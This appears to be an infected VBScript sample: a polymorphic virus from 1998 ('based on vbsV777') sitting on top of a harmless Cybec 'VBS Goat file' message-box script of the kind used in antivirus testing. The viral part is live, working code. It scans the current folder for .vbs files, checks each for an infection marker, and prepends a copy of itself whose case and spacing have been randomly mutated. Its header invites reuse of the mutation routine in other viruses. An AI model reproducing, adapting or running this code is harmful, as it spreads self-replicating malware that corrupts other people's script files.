'**********
'    A POLYmORphIc  ExAMPLE vb  scRIpt     vIRus  BaseD  on     vbsV777
'    By   sPo0kY  +  CaD    - 14.  NOv.   1998   -
'   FEEl FREe     tO  uSE    the  cbmUTaTE FunCtION    in    youR oWn     bugS    :-)

   Const     cbFOrreADinG    = 1   ,    CbFORWrItING     =  2

    rANDoMiZE
     
    CbwEpATH    =   wScRipt   .     SCriPtFulLnAme
     
     Set  CBFSO  = CReAtEOBjEcT   (   "SCRiPting.FILeSYSteMObJECT"  )
     
     sET  CBWefile     =    cbFSO   .     OpenteXTfile (  cBWEpAth   , cbfORReadING  )
     CbweCOdE  =     cBwEfile   .   ReadALl
     CbWEfILE     . ClOSE
   
     cBVIRUSSizE    =  inStr   (   3  ,     cBWeCodE , "*****"     &    "*****"   )   +    10     + 1

     Set     CbwEFile   =    cbFSo     .  OPEnTEXtfiLE    (   CBWepath   ,  CBforreAdIng    )
     CBWecoDe   =  CBwefile    .    rEAD ( CBvIrUSsIzE     )
 CBwEFILE .   Close
   
     FOr    Each     cbFILe  IN    CBFSo    .   gEtfOlDER     (  "." )     .     FIleS
   
 if LcaSe    (    CBFsO   .  GETExtENSIOnNaME    (  CbFIlE   .   naMe     )     )     = Chr     (   118  )   &     CHr     (   98     )    &  CHR     (   115     ) tHen
  
 Set    CbVIcTimfILE   =    cbfsO    .     opENTexTFilE     (   CBFile   . PaTH     ,  cBfORREadIng    )
  CBInFeCTiOnmARkER    =     cbvICTimFilE    .   rEaD ( 11  )
 CBvICTiMfILe   .    CLOse
 
    IF    CBinfECtIONmarker  <> "'*****" &     "*****"    tHEn

 sEt    CBviCtimFIle     =  cbFSo   .   OPeNTextFile     (    CbFilE  .   paTh ,    cbFOrreAdInG  )
 cbvIctImCodE   =  CBVICtimFiLE     .  REAdaLL
     cbVIctimfIle .   closE
  
    CBvicTimCoDe =  CBmutAtE  (    CBWECodE    )  &    cbVictImCOdE
     
     seT     cbvicTiMfiLe   =    cBFsO     .    OpeNTextfILe    ( cBFIle  .     path   ,  cBFOrWrItiNg   ,    1     )
     CBVictiMFiLE .  WrIte    CBVICTIMcOde
 cbVicTiMFile     .   clOsE
 
    End If
     
     end  IF
     
  nExT
 
    
   fUnctiON    cbmUTatE  (    CbsTrInG  )
  
     cbNEwstrIng     =   ""
     cbI   =     1
 
  WhILe   CbI <= LEn     (     cBStRInG  )
 
    iF    MiD     (    cbsTRInG ,  cBI  ,  1 ) =  CHR  (  32 )     TheN

   For  CBJ    =   1    To     InT (   5     *   Rnd    )  +   1

     CBNeWsTRiNg   =    CBneWSTrINg    +  ChR   (     32  )

  nexT
   
     DO
   
  Cbi  =   cbi     +  1
 
   lOoP   whILE   miD    (    cbstRInG    , CbI     ,     1  )    =    cHr     (     32   )
 
  ElsE
     
   iF     inT     ( 2    * RND     )   +    1     =     1 TheN

   CBneWsTriNG  =   CbNeWsTrIng +  ucaSe  ( Mid ( CbStrinG     ,    cBI   , 1     )    )

     eLSE

 cbNeWsTrING     =    cBNEwsTRINg   +     lCAse   (   mId (    CbsTrIng  ,   CBI    ,   1   )   )

     eNd   If

    CBi     =     CbI   +  1
 
 eNd    if
  
 WEnd
 
   cBMuTatE   =   cBNeWstrING
 
 EnD   fUNCTiON
  
   '**********
'VBS Goat file

Dim Msg, Style, Title, Help, Ctxt, Responce, MyString
Msg = "This is Cybec VBS Goat file"
Style = vbYesNo + vbExclamation + vbDefaultButton2
Title = "Goat File"
Help = "Goat.hlp"
Ctxt = 1000

Responce = MsgBox(Msg, Style, Title, Help, Ctxt)
